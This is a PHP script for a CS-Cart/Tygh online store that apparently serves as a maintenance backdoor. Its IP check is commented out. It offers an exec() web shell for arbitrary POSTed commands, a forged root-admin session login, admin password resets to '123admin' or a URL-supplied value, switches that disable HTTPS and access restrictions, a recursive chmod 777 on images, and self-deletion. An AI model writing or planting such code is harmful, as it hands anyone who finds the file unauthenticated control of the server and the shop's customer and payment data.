<?php 

if ($_SERVER['REMOTE_ADDR'] != '87.76.12.115') {
//  exit;
}

if ($_GET['mode'] == 'shell'){
	echo '
	<body bgcolor="black" TEXT="#FFFFFF">
	<form action="sph4.php?mode=shell" name="shell" method="post">
	<input type="text" name="cmd" value="';
	 echo $_POST['cmd'];
	 echo '" size="50"/>&nbsp;
	<input type="submit" value="POST request" />
	</form>
	<br /><br />
	';
	
	if ($_POST['cmd']){
	exec ($_POST['cmd'], $out);
		
			foreach ($out as $k => $v){
			echo "<pre>".$v."</pre>";
			}
		}
	echo '
	</body>
	';
	die();
}

if ($_GET['mode'] == 'phpinfo') {
	phpinfo();
	die();
}

DEFINE ('AREA', 'A');
DEFINE ('AREA_NAME' ,'admin');
DEFINE ('ACCOUNT_TYPE', 'admin');

//require './prepare.php';
require(dirname(__FILE__) . '/init.php');
use Tygh\Registry;

if ($_GET['mode'] == 'table_sizes') {
    $tables = db_get_fields("SHOW TABLES");
    
    $tbl_sizes = array();

    foreach ($tables as $table) {
        $sql = "SHOW TABLE STATUS LIKE '".$table."'";
        $que = db_get_row($sql) or die (mysql_error());
//      $tbl_sizes[$table] = $que['Data_length']+$que['Index_length'];
        $tbl_sizes[$table] = $que['Data_length'];
    }
    arsort($tbl_sizes);
    echo '<table>';
    foreach ($tbl_sizes as $tbl_name => $size)
        echo '<tr><td>'.$tbl_name.'</td><td>'.humanFSize($size).'</td></tr>';
    echo '</table>';
    $total_size = array_sum($tbl_sizes);

    echo humanFSize($total_size);
    die();
}


if ($_GET['mode'] == 'login' && !isset($_GET['kill'])) {
	$auth = array (
		'user_id' => 1,
		'area' => 'A',
		'user_type' => 'A',
		'login' => 'admin',
		'password_change_timestamp' => time(),
		'first_expire_check' => false,
		'this_login' => time(),
		'is_root' => 'Y',
        );
	$_SESSION['auth'] = $auth;
	$_SESSION['last_status'] = 'MTpBQ1RJVkU=';
	fn_redirect(Registry::get('config.admin_index'));
}

if ($_GET['mode'] == 'login' && isset($_GET['kill'])) {
	$auth = array (
		'user_id' => 1,
		'area' => 'A',
		'login' => 'admin',
		'membership_id' => '0',
		'password_change_timestamp' => time(),
		'first_expire_check' => false,
		'this_login' => time(),
	);
	$_SESSION['auth'] = $auth;
	unlink('sph.php');
	if (!is_file('sph.php')) {
		fn_set_notification('N','Notice', 'sph.php is removed');
	} else {
		fn_set_notification('E', 'Error', 'sph.php is not removed!');
	}
	fn_redirect(Registry::get('config.admin_index'));
}

if ($_GET['mode'] == 'logout') {
	$auth = array();
	unset($_SESSION['auth']);
	fn_redirect(Registry::get('config.admin_index'));
}

if ($_GET['mode'] == 'change_password') {
	db_query("UPDATE ?:users SET password = ?s WHERE user_id='1'", md5('123admin'));
	echo "Password Changed to '123admin'!";
}

if ($_GET['mode'] == 'restore_password' && !empty($_GET['passwd'])) {
	db_query("UPDATE ?:users SET password = ?s WHERE user_id='1'", $_GET['passwd']);
	echo "Password Restored to $_GET[passwd]!";
}

if ($_GET['mode'] == 'restore_password_md5' && !empty($_GET['passwd'])) {
	db_query("UPDATE ?:users SET password = ?s WHERE user_id='1'", md5($_GET['passwd']));
	echo "Password Restored to $_GET[passwd]!";
}

if ($_GET['mode'] == 'remove_https') {
	db_query("UPDATE ?:settings SET value='N' WHERE option_name='secure_checkout'");
	db_query("UPDATE ?:settings SET value='N' WHERE option_name='secure_admin'");
	echo "HTTPS disabled!";
}

if ($_GET['mode'] == 'ignore_AR') {
	db_query("UPDATE ?:addons SET status='D' WHERE addon='access_restrictions'");
	echo "Access Restriction is disabled!";
}
if ($_GET['mode'] == 'chmod') {
	chmodr('images', 0777);
	echo "chmod!";
}


function humanFSize($size)
{
    $filesizename = array("Byte", "Kb", "Mb", "Gb");
    return round($size/pow(1024, ($i = floor(log($size, 1024)))), 2).$filesizename[$i];
}

function chmodr($path, $filemode) { 
    if (!is_dir($path)) 
        return chmod($path, $filemode); 

    $dh = opendir($path); 
    while (($file = readdir($dh)) !== false) { 
        if($file != '.' && $file != '..') { 
            $fullpath = $path.'/'.$file; 
            if(is_link($fullpath)) 
                return FALSE; 
            elseif(!is_dir($fullpath) && !chmod($fullpath, $filemode)) 
                    return FALSE; 
            elseif(!chmodr($fullpath, $filemode)) 
                return FALSE; 
        } 
    } 

    closedir($dh); 

    if(chmod($path, $filemode)) 
        return TRUE; 
    else 
        return FALSE; 
}

?>